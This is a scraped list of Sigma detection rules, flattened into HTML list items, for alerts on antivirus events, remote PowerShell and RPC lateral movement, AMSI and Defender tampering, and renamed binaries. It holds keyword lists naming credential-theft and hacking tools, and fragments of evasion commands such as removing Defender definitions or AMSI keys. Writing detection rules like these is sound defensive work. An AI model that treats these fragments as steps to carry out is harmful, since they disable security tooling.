<li><a href="#">title:Relevant Anti-Virus Event id: 78bc5783-81d9-4d73-ac97-59f6db4f72a8 description: This detection method points out highly relevant Antivirus events status: experimental author: Florian Roth, Arnim Rupp date: 2017/02/19 modified: 2022/05/12 logsource: product: windows service: application references: - - - detection: keywords: - 'HTool-' - 'Hacktool' - 'ASP/Backdoor' - 'JSP/Backdoor' - 'PHP/Backdoor' - 'Backdoor.ASP' - 'Backdoor.JSP' - 'Backdoor.PHP' - 'Webshell' - 'Portscan' - 'Mimikatz' - '.WinCred.' # . are needed to avoid false positives with many other strings - 'PlugX' - 'Korplug' - 'Pwdump' - 'Chopper' - 'WmiExec' - 'Xscan' - 'Clearlog' - 'ASPXSpy' - 'Ransom' - 'Filecoder' - 'CobaltStr' # Update 12.05.22 - 'PWCrack' - 'DumpCreds' - 'MPreter' - 'Koadic' - 'Packed.Generic.347' - 'COBEACON' - 'Cometer' - 'Keylogger' - 'MeteTool' filter: - 'Keygen' - 'Crack' - 'anti_ransomware_service.exe' - 'cyber-protect-service.exe' filter_information: Level: 4 # Information level condition: keywords and not 1 of filter* falsepositives: - Some software piracy tools (key generators, cracks) are classified as hack tools level: high tags: - attack.resource_development - attack.t1588 
<li><a href="#">title:Relevant ClamAV Message id: 36aa86ca-fd9d-4456-814e-d3b1b8e1e0bb status: stable description: Detects relevant ClamAV messages author: Florian Roth date: 2017/03/01 references: - logsource: product: linux service: clamav detection: keywords: - 'Trojan*FOUND' - 'VirTool*FOUND' - 'Webshell*FOUND' - 'Rootkit*FOUND' - 'Htran*FOUND' condition: keywords falsepositives: - Unknown level: high tags: - attack.resource_development - attack.t1588.001 
<li><a href="#">title:Remote Code Execute via Winrm.vbs id: 9df0dd3a-1a5c-47e3-a2bc-30ed177646a0 status: test description: Detects an attempt to execute code or create service on remote host via winrm.vbs. author: Julia Fomina, oscd.community references: - - date: 2020/10/07 modified: 2022/05/13 logsource: category: process_creation product: windows detection: selection_img: - Image|endswith: '\cscript.exe' - OriginalFileName: 'cscript.exe' selection_cli: CommandLine|contains|all: - 'winrm' - 'invoke Create wmicimv2/Win32_' - '-r:http' condition: all of selection* falsepositives: - Legitimate use for administartive purposes. Unlikely level: medium tags: - attack.defense_evasion - attack.t1216 
<li><a href="#">title:Remote DCOM/WMI Lateral Movement id: 68050b10-e477-4377-a99b-3721b422d6ef description: Detects remote RPC calls that performs remote DCOM operations. These could be abused for lateral movement via DCOM or WMI. references: - - - - - - tags: - attack.lateral_movement - attack.t1021.003 - attack.t1047 status: experimental author: Sagie Dulce, Dekel Paz date: 2022/01/01 modified: 2022/01/01 logsource: product: rpc_firewall category: application definition: 'Requirements: install and apply the RPC Firewall to all processes with "audit:true action:block uuid:367abb81-9844-35f1-ad32-98f038001003' detection: selection: EventLog: RPCFW EventID: 3 InterfaceUuid: - 4d9f4ab8-7d1c-11cf-861e-0020af6e7c57 - 99fcfec4-5260-101b-bbcb-00aa0021347a - 000001a0-0000-0000-c000-000000000046 - 00000131-0000-0000-c000-000000000046 - 00000143-0000-0000-c000-000000000046 - 00000000-0000-0000-c000-000000000046 condition: selection falsepositives: - Some administrative tasks on remote host level: high 
<li><a href="#">title:Remote Desktop Protocol Use Mstsc id: 954f0af7-62dd-418f-b3df-a84bc2c7a774 status: experimental description: Adversaries may use Valid Accounts to log into a computer using the Remote Desktop Protocol (RDP). The adversary may then perform actions as the logged-on user. author: frack113 references: - - date: 2022/01/07 modified: 2022/06/12 logsource: category: process_creation product: windows detection: selection_mstsc_img: - Image|endswith: \mstsc.exe - OriginalFileName: 'mstsc.exe' selection_mstsc_cli: CommandLine|contains: ' /v:' selection_cmdkey_img: - Image|endswith: \cmdkey.exe - OriginalFileName: 'cmdkey.exe' selection_cmdkey_cli: CommandLine|contains|all: - ' /g' - ' /u' - ' /p' condition: all of selection_mstsc* or all of selection_cmdkey* falsepositives: - Unknown level: medium tags: - attack.lateral_movement - attack.t1021.001 
<li><a href="#">title:Remote Encrypting File System Abuse id: 5f92fff9-82e2-48eb-8fc1-8b133556a551 description: Detects remote RPC calls to possibly abuse remote encryption service via MS-EFSR references: - - - - - tags: - attack.lateral_movement status: experimental author: Sagie Dulce, Dekel Paz date: 2022/01/01 modified: 2022/01/01 logsource: product: rpc_firewall category: application definition: 'Requirements: install and apply the RPC Firewall to all processes with "audit:true action:block uuid:df1941c5-fe89-4e79-bf10-463657acf44d or c681d488-d850-11d0-8c52-00c04fd90f7e' detection: selection: EventLog: RPCFW EventID: 3 InterfaceUuid: - df1941c5-fe89-4e79-bf10-463657acf44d - c681d488-d850-11d0-8c52-00c04fd90f7e condition: selection falsepositives: - Legitimate usage of remote file encryption level: high 
<li><a href="#">title:Remote Event Log Recon id: 2053961f-44c7-4a64-b62d-f6e72800af0d description: Detects remote RPC calls to get event log information via EVEN or EVEN6 references: - - - - status: experimental author: Sagie Dulce, Dekel Paz date: 2022/01/01 modified: 2022/01/01 logsource: product: rpc_firewall category: application definition: 'Requirements: install and apply the RPC Firewall to all processes with "audit:true action:block uuid:82273fdc-e32a-18c3-3f78-827929dc23ea and uuid:f6beaff7-1e19-4fbb-9f8f-b89e2018337c"' detection: selection: EventLog: RPCFW EventID: 3 InterfaceUuid: - 82273fdc-e32a-18c3-3f78-827929dc23ea - f6beaff7-1e19-4fbb-9f8f-b89e2018337c condition: selection falsepositives: - Remote administrative tasks on Windows Events level: high 
<li><a href="#">title:Remote File Copy id: 7a14080d-a048-4de8-ae58-604ce58a795b status: stable description: Detects the use of tools that copy files from or to remote systems author: Ã–mer GÃ¼nal date: 2020/06/18 references: - logsource: product: linux detection: tools: - 'scp ' - 'rsync ' - 'sftp ' filter: - '@' - ':' condition: tools and filter falsepositives: - Legitimate administration activities level: low tags: - attack.command_and_control - attack.lateral_movement - attack.t1105 
<li><a href="#">title:Remote PowerShell Session (Network) id: c539afac-c12a-46ed-b1bd-5a5567c9f045 status: test description: Detects remote PowerShell connections by monitoring network outbound connections to ports 5985 or 5986 from a non-network service account. author: Roberto Rodriguez @Cyb3rWard0g references: - date: 2019/09/12 modified: 2022/06/20 logsource: category: network_connection product: windows detection: selection: DestinationPort: - 5985 - 5986 filter: - User|contains: # covers many language settings - 'AUTHORI' - 'AUTORI' - SourceIp|startswith: '0:0:' condition: selection and not filter falsepositives: - Legitimate usage of remote PowerShell, e.g. remote administration and monitoring. level: high tags: - attack.execution - attack.t1059.001 - attack.lateral_movement - attack.t1021.006 
<li><a href="#">title:Remote PowerShell Session (PS Classic) id: 60167e5c-84b2-4c95-a7ac-86281f27c445 related: - id: 96b9f619-aa91-478f-bacb-c3e50f8df575 type: derived description: Detects remote PowerShell sessions status: test date: 2019/08/10 modified: 2022/06/20 author: Roberto Rodriguez @Cyb3rWard0g references: - tags: - attack.execution - attack.t1059.001 - attack.lateral_movement - attack.t1021.006 logsource: product: windows category: ps_classic_start definition: fields have to be extract from event detection: selection: HostName: 'ServerRemoteHost' HostApplication|contains: 'wsmprovhost.exe' condition: selection falsepositives: - Legitimate use remote PowerShell sessions level: high 
<li><a href="#">title:Remote PowerShell Session (PS Module) id: 96b9f619-aa91-478f-bacb-c3e50f8df575 description: Detects remote PowerShell sessions status: test date: 2019/08/10 modified: 2022/06/20 author: Roberto Rodriguez @Cyb3rWard0g, Tim Shelton references: - tags: - attack.execution - attack.t1059.001 - attack.lateral_movement - attack.t1021.006 logsource: product: windows category: ps_module definition: PowerShell Module Logging must be enabled detection: selection: ContextInfo|contains|all: - ' = ServerRemoteHost ' # HostName: 'ServerRemoteHost' french : Nom dâ€™hÃ´te = - 'wsmprovhost.exe' # HostApplication|contains: 'wsmprovhost.exe' french Application hÃ´te = false_positive_1: ContextInfo|contains: '\Windows\system32\WindowsPowerShell\v1.0\Modules\Microsoft.PowerShell.Archive\Microsoft.PowerShell.Archive.psm1' condition: selection and not 1 of false_positive* falsepositives: - Legitimate use remote PowerShell sessions level: high 
<li><a href="#">title:Remote PowerShell Session Host Process (WinRM) id: 734f8d9b-42b8-41b2-bcf5-abaf49d5a3c8 description: Detects remote PowerShell sections by monitoring for wsmprovhost (WinRM host process) as a parent or child process (sign of an active PowerShell remote session). status: experimental date: 2019/09/12 modified: 2021/05/21 author: Roberto Rodriguez @Cyb3rWard0g references: - tags: - attack.execution - attack.t1059.001 - attack.t1021.006 logsource: category: process_creation product: windows detection: selection: - Image|endswith: '\wsmprovhost.exe' - ParentImage|endswith: '\wsmprovhost.exe' condition: selection fields: - ComputerName - User - CommandLine falsepositives: - Legitimate usage of remote Powershell, e.g. for monitoring purposes. level: medium 
<li><a href="#">title:Remote PowerShell Sessions Network Connections (WinRM) id: 13acf386-b8c6-4fe0-9a6e-c4756b974698 description: Detects basic PowerShell Remoting (WinRM) by monitoring for network inbound connections to ports 5985 OR 5986 status: experimental date: 2019/09/12 modified: 2021/05/21 author: Roberto Rodriguez @Cyb3rWard0g references: - tags: - attack.execution - attack.t1059.001 logsource: product: windows service: security detection: selection: EventID: 5156 DestPort: - 5985 - 5986 LayerRTID: 44 condition: selection falsepositives: - Legitimate use of remote PowerShell execution level: high 
<li><a href="#">title:Remote Printing Abuse for Lateral Movement id: bc3a4b0c-e167-48e1-aa88-b3020950e560 description: Detects remote RPC calls to possibly abuse remote printing service via MS-RPRN / MS-PAR references: - - - - - - - tags: - attack.lateral_movement status: experimental author: Sagie Dulce, Dekel Paz date: 2022/01/01 modified: 2022/01/01 logsource: product: rpc_firewall category: application definition: 'Requirements: install and apply the RPC Firewall to all processes with "audit:true action:block uuid:12345678-1234-abcd-ef00-0123456789ab or 76f03f96-cdfd-44fc-a22c-64950a001209 or ae33069b-a2a8-46ee-a235-ddfd339be281 or 0b6edbfa-4a24-4fc6-8a23-942b1eca65d1' detection: selection: EventLog: RPCFW EventID: 3 InterfaceUuid: - 12345678-1234-abcd-ef00-0123456789ab - 76f03f96-cdfd-44fc-a22c-64950a001209 - 0b6edbfa-4a24-4fc6-8a23-942b1eca65d1 - ae33069b-a2a8-46ee-a235-ddfd339be281 condition: selection falsepositives: - Actual printing level: high 
<li><a href="#">title:Remote Procedure Call Service Anomaly id: a7cd7306-df8b-4398-b711-6f3e4935cf16 status: experimental description: Detects suspicious remote procedure call (RPC) service anomalies based on the spawned sub processes (long shot to detect the exploitation of vulnerabilities like CVE-2022-26809) author: Florian Roth references: - - - date: 2022/04/13 logsource: category: process_creation product: windows detection: selection: ParentCommandLine|startswith: 'C:\WINDOWS\system32\svchost.exe -k RPCSS' condition: selection falsepositives: - Unknown - Some cases in which the service spawned a werfault.exe process level: high tags: - attack.initial_access - attack.t1190 - attack.execution - attack.t1569.002 
<li><a href="#">title:Remote Registry Lateral Movement id: 35c55673-84ca-4e99-8d09-e334f3c29539 description: Detects remote RPC calls to modify the registry and possible execute code references: - - - - - - tags: - attack.lateral_movement status: experimental author: Sagie Dulce, Dekel Paz date: 2022/01/01 modified: 2022/01/01 logsource: product: rpc_firewall category: application definition: 'Requirements: install and apply the RPC Firewall to all processes with "audit:true action:block uuid:338cd001-2244-31f1-aaaa-900038001003"' detection: selection: EventLog: RPCFW EventID: 3 InterfaceUuid: 338cd001-2244-31f1-aaaa-900038001003 OpNum: - 6 - 7 - 8 - 13 - 18 - 19 - 21 - 22 - 23 - 35 condition: selection falsepositives: - Remote administration of registry values level: high 
<li><a href="#">title:Remote Registry Management Using Reg Utility id: 68fcba0d-73a5-475e-a915-e8b4c576827e status: test description: Remote registry management using REG utility from non-admin workstation author: Teymur Kheirkhabarov, oscd.community references: - date: 2019/10/22 modified: 2021/11/27 logsource: product: windows service: security detection: selection_1: EventID: 5145 RelativeTargetName|contains: '\winreg' filter: IpAddress: '%Admins_Workstations%' condition: selection_1 and not filter falsepositives: - Legitimate usage of remote registry management by administrator level: medium tags: - attack.defense_evasion - attack.t1112 - attack.discovery - attack.t1012 - attack.credential_access - attack.t1552.002 - attack.s0075 
<li><a href="#">title:Remote Registry Recon id: d8ffe17e-04be-4886-beb9-c1dd1944b9a8 description: Detects remote RPC calls to collect information references: - - - - - status: experimental author: Sagie Dulce, Dekel Paz date: 2022/01/01 modified: 2022/01/01 logsource: product: rpc_firewall category: application definition: 'Requirements: install and apply the RPC Firewall to all processes with "audit:true action:block uuid:338cd001-2244-31f1-aaaa-900038001003"' detection: selection: EventLog: RPCFW EventID: 3 InterfaceUuid: 338cd001-2244-31f1-aaaa-900038001003 filter: OpNum: - 6 - 7 - 8 - 13 - 18 - 19 - 21 - 22 - 23 - 35 condition: selection and not filter falsepositives: - Remote administration of registry values level: high 
<li><a href="#">title:Remote Schedule Task Lateral Movement via ATSvc id: 0fcd1c79-4eeb-4746-aba9-1b458f7a79cb description: Detects remote RPC calls to create or execute a scheduled task via ATSvc references: - - - - - - tags: - attack.lateral_movement - attack.t1053 - attack.t1053.002 status: experimental author: Sagie Dulce, Dekel Paz date: 2022/01/01 modified: 2022/01/01 logsource: product: rpc_firewall category: application definition: 'Requirements: install and apply the RPC Firewall to all processes with "audit:true action:block uuid:1ff70682-0a51-30e8-076d-740be8cee98b"' detection: selection: EventLog: RPCFW EventID: 3 InterfaceUuid: 1ff70682-0a51-30e8-076d-740be8cee98b OpNum: - 0 - 1 condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:Remote Schedule Task Lateral Movement via ITaskSchedulerService id: ace3ff54-e7fd-46bd-8ea0-74b49a0aca1d description: Detects remote RPC calls to create or execute a scheduled task references: - - - - - - tags: - attack.lateral_movement - attack.t1053 - attack.t1053.002 status: experimental author: Sagie Dulce, Dekel Paz date: 2022/01/01 modified: 2022/01/01 logsource: product: rpc_firewall category: application definition: 'Requirements: install and apply the RPC Firewall to all processes with "audit:true action:block uuid:86d35949-83c9-4044-b424-db363231fd0c"' detection: selection: EventLog: RPCFW EventID: 3 InterfaceUuid: 86d35949-83c9-4044-b424-db363231fd0c OpNum: - 1 - 3 - 4 - 10 - 11 - 12 - 13 - 14 - 15 condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:Remote Schedule Task Lateral Movement via SASec id: 0a3ff354-93fc-4273-8a03-1078782de5b7 description: Detects remote RPC calls to read information about scheduled tasks via SASec references: - - - - - status: experimental author: Sagie Dulce, Dekel Paz date: 2022/01/01 modified: 2022/01/01 logsource: product: rpc_firewall category: application definition: 'Requirements: install and apply the RPC Firewall to all processes with "audit:true action:block uuid:378e52b0-c0a9-11cf-822d-00aa0051e40f"' detection: selection: EventLog: RPCFW EventID: 3 InterfaceUuid: 378e52b0-c0a9-11cf-822d-00aa0051e40f filter: OpNum: - 0 - 1 condition: selection and not filter falsepositives: - Unknown level: high 
<li><a href="#">title:Remote Schedule Task Lateral Movement via SASec id: aff229ab-f8cd-447b-b215-084d11e79eb0 description: Detects remote RPC calls to create or execute a scheduled task via SASec references: - - - - - - tags: - attack.lateral_movement - attack.t1053 - attack.t1053.002 status: experimental author: Sagie Dulce, Dekel Paz date: 2022/01/01 modified: 2022/01/01 logsource: product: rpc_firewall category: application definition: 'Requirements: install and apply the RPC Firewall to all processes with "audit:true action:block uuid:378e52b0-c0a9-11cf-822d-00aa0051e40f"' detection: selection: EventLog: RPCFW EventID: 3 InterfaceUuid: 378e52b0-c0a9-11cf-822d-00aa0051e40f OpNum: - 0 - 1 condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:Remote Schedule Task Recon via AtScv id: f177f2bc-5f3e-4453-b599-57eefce9a59c description: Detects remote RPC calls to read information about scheduled tasks via AtScv references: - - - - - - status: experimental author: Sagie Dulce, Dekel Paz date: 2022/01/01 modified: 2022/01/01 logsource: product: rpc_firewall category: application definition: 'Requirements: install and apply the RPC Firewall to all processes with "audit:true action:block uuid:1ff70682-0a51-30e8-076d-740be8cee98b"' detection: selection: EventLog: RPCFW EventID: 3 InterfaceUuid: 1ff70682-0a51-30e8-076d-740be8cee98b filter: OpNum: - 0 - 1 condition: selection and not filter falsepositives: - Unknown level: high 
<li><a href="#">title:Remote Schedule Task Recon via ITaskSchedulerService id: 7f7c49eb-2977-4ac8-8ab0-ab1bae14730e description: Detects remote RPC calls to read information about scheduled tasks references: - - - - - status: experimental author: Sagie Dulce, Dekel Paz date: 2022/01/01 modified: 2022/01/01 logsource: product: rpc_firewall category: application definition: 'Requirements: install and apply the RPC Firewall to all processes with "audit:true action:block uuid:86d35949-83c9-4044-b424-db363231fd0c"' detection: selection: EventLog: RPCFW EventID: 3 InterfaceUuid: 86d35949-83c9-4044-b424-db363231fd0c filter: OpNum: - 1 - 3 - 4 - 10 - 11 - 12 - 13 - 14 - 15 condition: selection and not filter falsepositives: - Unknown level: high 
<li><a href="#">title:Remote Server Service Abuse for Lateral Movement id: 10018e73-06ec-46ec-8107-9172f1e04ff2 description: Detects remote RPC calls to possibly abuse remote encryption service via MS-EFSR references: - - - - - - tags: - attack.lateral_movement - attack.t1569.002 status: experimental author: Sagie Dulce, Dekel Paz date: 2022/01/01 modified: 2022/01/01 logsource: product: rpc_firewall category: application definition: 'Requirements: install and apply the RPC Firewall to all processes with "audit:true action:block uuid:367abb81-9844-35f1-ad32-98f038001003' detection: selection: EventLog: RPCFW EventID: 3 InterfaceUuid: 367abb81-9844-35f1-ad32-98f038001003 condition: selection falsepositives: - Administrative tasks on remote services level: high 
<li><a href="#">title:Remote Server Service Abuse id: b6ea3cc7-542f-43ef-bbe4-980fbed444c7 description: Detects remote RPC calls to possibly abuse remote encryption service via MS-SRVS references: - - - - - tags: - attack.lateral_movement status: experimental author: Sagie Dulce, Dekel Paz date: 2022/01/01 modified: 2022/01/01 logsource: product: rpc_firewall category: application definition: 'Requirements: install and apply the RPC Firewall to all processes with "audit:true action:block uuid:4b324fc8-1670-01d3-1278-5a47bf6ee188' detection: selection: EventLog: RPCFW EventID: 3 InterfaceUuid: 4b324fc8-1670-01d3-1278-5a47bf6ee188 condition: selection falsepositives: - Legitimate remote share creation level: high 
<li><a href="#">title:Remote Service Activity via SVCCTL Named Pipe id: 586a8d6b-6bfe-4ad9-9d78-888cd2fe50c3 status: test description: Detects remote service activity via remote access to the svcctl named pipe author: Samir Bousseaden references: - date: 2019/04/03 modified: 2021/11/27 logsource: product: windows service: security definition: 'The advanced audit policy setting "Object Access > Audit Detailed File Share" must be configured for Success/Failure' detection: selection: EventID: 5145 ShareName: \\\*\IPC$ RelativeTargetName: svcctl Accesses|contains: 'WriteData' condition: selection falsepositives: - Unknown level: medium tags: - attack.lateral_movement - attack.persistence - attack.t1021.002 
<li><a href="#">title:Remote Task Creation via ATSVC Named Pipe - Zeek id: dde85b37-40cd-4a94-b00c-0b8794f956b5 status: test description: Detects remote task creation via at.exe or API interacting with ATSVC namedpipe author: 'Samir Bousseaden, @neu5rn' references: - date: 2020/04/03 modified: 2021/11/27 logsource: product: zeek service: smb_files detection: selection: path: \\\*\IPC$ name: atsvc #Accesses: '*WriteData*' condition: selection falsepositives: - Unknown level: medium tags: - attack.lateral_movement - attack.persistence - car.2013-05-004 - car.2015-04-001 - attack.t1053.002 
<li><a href="#">title:Remote Task Creation via ATSVC Named Pipe id: f6de6525-4509-495a-8a82-1f8b0ed73a00 status: test description: Detects remote task creation via at.exe or API interacting with ATSVC namedpipe author: Samir Bousseaden references: - date: 2019/04/03 modified: 2021/11/27 logsource: product: windows service: security definition: 'The advanced audit policy setting "Object Access > Audit Detailed File Share" must be configured for Success/Failure' detection: selection: EventID: 5145 ShareName: \\\*\IPC$ RelativeTargetName: atsvc Accesses|contains: 'WriteData' condition: selection falsepositives: - Unknown level: medium tags: - attack.lateral_movement - attack.persistence - car.2013-05-004 - car.2015-04-001 - attack.t1053.002 
<li><a href="#">title:Remote Thread Creation in Suspicious Targets id: a1a144b7-5c9b-4853-a559-2172be8d4a03 status: experimental description: Detects a remote thread creation in suspicious taregt images references: - author: Florian Roth date: 2022/03/16 logsource: product: windows category: create_remote_thread detection: selection: TargetImage|endswith: - '\mspaint.exe' - '\calc.exe' - '\notepad.exe' - '\sethc.exe' - '\write.exe' - '\wordpad.exe' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:Remote Thread Creation Ttdinject.exe Proxy id: c15e99a3-c474-48ab-b9a7-84549a7a9d16 status: experimental description: Detects a remote thread creation of Ttdinject.exe used as proxy author: frack113 references: - date: 2022/05/16 modified: 2022/06/02 logsource: product: windows category: create_remote_thread detection: selection: SourceImage|endswith: '\ttdinject.exe' condition: selection falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1127 
<li><a href="#">title:Remote WMI ActiveScriptEventConsumers id: 9599c180-e3a8-4743-8f92-7fb96d3be648 status: test description: Detect potential adversaries leveraging WMI ActiveScriptEventConsumers remotely to move laterally in a network author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research) references: - date: 2020/09/02 modified: 2021/11/27 logsource: product: windows service: security detection: selection: EventID: 4624 LogonType: 3 ProcessName|endswith: 'scrcons.exe' filter: TargetLogonId: '0x3e7' condition: selection and not filter falsepositives: - SCCM level: high tags: - attack.lateral_movement - attack.privilege_escalation - attack.persistence - attack.t1546.003 
<li><a href="#">title:Removal Amsi Provider Reg Key id: 41d1058a-aea7-4952-9293-29eaaf516465 description: Remove the AMSI Provider registry key in HKLM\Software\Microsoft\AMSI to disable AMSI inspection status: experimental date: 2021/06/07 modified: 2022/03/26 author: frack113 references: - - logsource: product: windows category: registry_delete definition: key must be add to the sysmon configuration to works detection: selection: EventType: DeleteKey TargetObject|endswith: - '{2781761E-28E0-4109-99FE-B9D127C57AFE}' - '{A7C452EF-8E9F-42EB-9F2B-245613CA0DC9}' condition: selection falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1562.001 
<li><a href="#">title:Removal of Potential COM Hijacking Registry Keys id: 96f697b0-b499-4e5d-9908-a67bec11cdb6 status: test description: A General detection to trigger for processes removing .*\shell\open\command registry keys. Registry keys that might have been used for COM hijacking activities. author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research) references: - - - - - date: 2020/05/02 modified: 2022/03/26 logsource: product: windows category: registry_delete detection: selection: EventType: 'DeleteKey' TargetObject|endswith: '\shell\open\command' filter_svchost: Image: 'C:\Windows\system32\svchost.exe' filter_office: Image|startswith: - 'C:\Program Files\Common Files\Microsoft Shared\ClickToRun\' - 'C:\Program Files\Common Files\Microsoft Shared\ClickToRun\Updates\' Image|endswith: '\OfficeClickToRun.exe' filter_integrator: Image: 'C:\Program Files (x86)\Microsoft Office\root\integration\integrator.exe' filter_dropbox: Image|endswith: '\Dropbox.exe' TargetObject|startswith: 'HKCR\Dropbox.' condition: selection and not 1 of filter_* falsepositives: - Unknown level: medium tags: - attack.defense_evasion - attack.t1112 
<li><a href="#">title:Removal SD Value to Hide Schedule Task id: acd74772-5f88-45c7-956b-6a7b36c294d2 description: Remove SD (Security Descriptor) value in \Schedule\TaskCache\Tree registry hive to hide schedule task. This technique is used by Tarrask malware status: experimental date: 2022/04/15 author: Sittikorn S references: - logsource: product: windows category: registry_delete definition: key must be add to the sysmon configuration to works detection: selection: EventType: DeleteKey TargetObject|contains|all: - '\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\' - 'SD' condition: selection falsepositives: - Unknown level: medium tags: - attack.defense_evasion - attack.t1562 
<li><a href="#">title:Remove Account From Domain Admin Group id: 48a45d45-8112-416b-8a67-46e03a4b2107 status: experimental author: frack113 date: 2021/12/26 description: | Adversaries may interrupt availability of system and network resources by inhibiting access to accounts utilized by legitimate users. Accounts may be deleted, locked, or manipulated (ex: changed credentials) to remove access to accounts. references: - logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains|all: - 'Remove-ADGroupMember' - '-Identity ' - '-Members ' condition: selection falsepositives: - Unknown level: medium tags: - attack.impact - attack.t1531 
<li><a href="#">title:Remove Exported Mailbox from Exchange Webserver id: 09570ae5-889e-43ea-aac0-0e1221fb3d95 status: experimental description: Detects removal of an exported Exchange mailbox which could be to cover tracks from ProxyShell exploit references: - author: Christian Burkard date: 2021/08/27 logsource: service: msexchange-management product: windows detection: command: - 'Remove-MailboxExportRequest' - ' -Identity ' - ' -Confirm "False"' condition: all of command falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1070 
<li><a href="#">title:Remove Immutable File Attribute id: a5b977d6-8a81-4475-91b9-49dbfcd941f7 status: test description: Detects removing immutable file attribute. author: Jakob Weinzettl, oscd.community references: - date: 2019/09/23 modified: 2021/11/27 logsource: product: linux service: auditd detection: selection: type: 'EXECVE' a0|contains: 'chattr' a1|contains: '-i' condition: selection falsepositives: - Administrator interacting with immutable files (e.g. for instance backups). level: medium tags: - attack.defense_evasion - attack.t1222.002 
<li><a href="#">title:Remove Windows Defender Definition Files id: 9719a8aa-401c-41af-8108-ced7ec9cd75c status: experimental author: frack113 date: 2021/07/07 description: Adversaries may disable security tools to avoid possible detection of their tools and activities by removing Windows Defender Definition Files references: - - tags: - attack.defense_evasion - attack.t1562.001 logsource: category: process_creation product: windows detection: selection: OriginalFileName: MpCmdRun.exe CommandLine|contains|all: - ' -RemoveDefinitions' - ' -All' condition: selection fields: - ComputerName - User - CommandLine - ParentCommandLine falsepositives: - Unknown level: medium 
<li><a href="#">title:Rename Common File to DLL File id: bbfd974c-248e-4435-8de6-1e938c79c5c1 status: experimental description: Detects cases in which a file gets renamed to .dll, which often happens to bypass perimeter protection references: - - author: frack113 date: 2022/02/19 modified: 2022/03/13 logsource: product: windows category: file_rename detection: to_dll: TargetFilename|endswith: '.dll' filter_from_dll: - OriginalFilename|endswith: - '.dll' - '.tmp' # VSCode FP - OriginalFilename|contains: - '.dll.' - '\SquirrelTemp\temp' filter_tiworker: Image|startswith: 'C:\Windows\WinSxS\' Image|endswith: '\TiWorker.exe' condition: to_dll and not 1 of filter* falsepositives: - Application installation level: medium 
<li><a href="#">title:Renamed Binary id: 36480ae1-a1cb-4eaa-a0d6-29801d7e9142 status: test description: Detects the execution of a renamed binary often used by attackers or malware leveraging new Sysmon OriginalFileName datapoint. author: Matthew Green - @mgreen27, Ecco, James Pemberton / @4A616D6573, oscd.community (improvements), Andreas Hunkeler (@Karneades) references: - - - date: 2019/06/15 modified: 2022/06/28 logsource: category: process_creation product: windows detection: selection: OriginalFileName: - 'Cmd.Exe' - 'CONHOST.EXE' - 'PowerShell.EXE' - 'powershell_ise.EXE' - 'psexec.exe' - 'psexec.c' # old versions of psexec (2016 seen) - 'cscript.exe' - 'wscript.exe' - 'MSHTA.EXE' - 'REGSVR32.EXE' - 'wmic.exe' - 'CertUtil.exe' - 'RUNDLL32.EXE' - 'CMSTP.EXE' - 'msiexec.exe' - '7z.exe' - 'WinRAR.exe' - 'wevtutil.exe' - 'net.exe' - 'net1.exe' - 'netsh.exe' filter: Image|endswith: - '\cmd.exe' - '\conhost.exe' - '\powershell.exe' - '\powershell_ise.exe' - '\psexec.exe' - '\psexec64.exe' - '\cscript.exe' - '\wscript.exe' - '\mshta.exe' - '\regsvr32.exe' - '\WMIC.exe' - '\certutil.exe' - '\rundll32.exe' - '\cmstp.exe' - '\msiexec.exe' - '\7z.exe' - '\WinRAR.exe' - '\wevtutil.exe' - '\net.exe' - '\net1.exe' - '\netsh.exe' condition: selection and not filter falsepositives: - Custom applications use renamed binaries adding slight change to binary name. Typically this is easy to spot and add to whitelist - PsExec installed via Windows Store doesn't contain original filename field (False negative) level: medium tags: - attack.defense_evasion - attack.t1036.003 
<li><a href="#">title:Renamed jusched.exe id: edd8a48c-1b9f-4ba1-83aa-490338cd1ccb status: test description: Detects renamed jusched.exe used by cobalt group author: Markus Neis, Swisscom references: - date: 2019/06/04 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection1: Description: Java Update Scheduler selection2: Description: Java(TM) Update Scheduler filter: Image|endswith: '\jusched.exe' condition: (selection1 or selection2) and not filter falsepositives: - Unknown level: high tags: - attack.execution - attack.defense_evasion - attack.t1036.003 
<li><a href="#">title:Renamed MegaSync id: 643bdcac-8b82-49f4-9fd9-25a90b929f3b status: experimental description: Detects the execution of a renamed meg.exe of MegaSync during incident response engagements associated with ransomware families like Nefilim, Sodinokibi, Pysa, and Conti. references: - author: Sittikorn S date: 2021/06/22 tags: - attack.defense_evasion - attack.t1218 logsource: product: windows category: process_creation detection: selection_proc: ParentImage|endswith: '\explorer.exe' CommandLine|contains: 'C:\Windows\Temp\meg.exe' selection_orig: OriginalFileName: 'meg.exe' filter: Image|endswith: '\meg.exe' condition: selection_proc or ( selection_orig and not filter ) falsepositives: - Software that illegaly integrates MegaSync in a renamed form - Administrators that have renamed MegaSync level: high 
<li><a href="#">title:Renamed Msdt.exe id: bd1c6866-65fc-44b2-be51-5588fcff82b9 status: experimental description: Detects process creation with a renamed Msdt.exe author: pH-T date: 2022/06/03 references: - tags: - attack.defense_evasion - attack.t1036.003 logsource: category: process_creation product: windows detection: selection: OriginalFileName: 'msdt.exe' filter_realmsdt: Image|endswith: '\msdt.exe' condition: selection and not 1 of filter* falsepositives: - Unlikely level: high 
<li><a href="#">title:Renamed PAExec id: c4e49831-1496-40cf-8ce1-b53f942b02f9 status: experimental description: Detects suspicious renamed PAExec execution as often used by attackers references: - author: Florian Roth date: 2021/05/22 modified: 2021/07/06 logsource: category: process_creation product: windows detection: selection1: Description: 'PAExec Application' selection2: OriginalFileName: 'PAExec.exe' filter: Image|endswith: - '\PAexec.exe' - '\paexec.exe' condition: ( selection1 or selection2 ) and not filter falsepositives: - Weird admins that rename their tools - Software companies that bundle PAExec with their software and rename it, so that it is less embarrassing level: high tags: - attack.defense_evasion - attack.t1202 
